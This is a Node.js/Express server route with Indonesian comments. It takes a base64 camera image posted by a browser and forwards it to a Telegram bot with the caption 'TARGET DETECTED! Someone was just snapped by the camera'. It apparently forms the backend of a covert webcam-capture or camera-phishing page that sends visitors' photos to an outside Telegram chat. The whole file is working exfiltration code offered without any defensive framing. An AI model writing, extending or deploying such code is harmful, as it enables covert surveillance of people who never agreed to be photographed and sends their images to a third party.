app.post('/simpan', async (req, res) => {
    const base64Data = req.body.image;

    if (!base64Data) {
        return res.json({ status: false, msg: "Gambar tidak ada" });
    }

    try {
        // 1. Hapus header base64 (data:image/jpeg;base64,)
        const base64Image = base64Data.split(';base64,').pop();
        
        // 2. Ubah jadi Buffer (data mentah gambar)
        const buffer = Buffer.from(base64Image, 'base64');

        // 3. Siapkan FormData untuk Telegram
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        // Bungkus buffer ke dalam Blob agar bisa dikirim sebagai file
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'tangkapan.jpg');
        
        formData.append('caption', '📸 *TARGET TERDETEKSI!*\n\nSeseorang baru saja terjepret kamera.');
        formData.append('parse_mode', 'Markdown');

        // 4. Tembak ke API Telegram
        const teleRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const hasil = await teleRes.json();
        
        if (hasil.ok) {
            console.log("✅ Foto berhasil terkirim ke Telegram!");
            res.json({ status: true });
        } else {
            console.log("❌ Gagal kirim ke Tele:", hasil.description);
            res.json({ status: false, error: hasil.description });
        }
    } catch (err) {
        console.error("🔥 Error di Server:", err);
        res.json({ status: false, error: err.message });
    }
});